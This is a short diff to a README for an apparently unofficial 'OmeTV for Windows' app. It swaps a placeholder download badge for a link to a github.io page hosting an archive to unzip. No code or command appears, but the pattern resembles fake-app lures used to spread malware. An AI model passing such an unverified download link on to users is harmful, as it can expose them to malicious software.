@@ -6,7 +6,7 @@ OmeTV for Windows brings spontaneous conversations to your desktop, connecting y
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://ometv-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
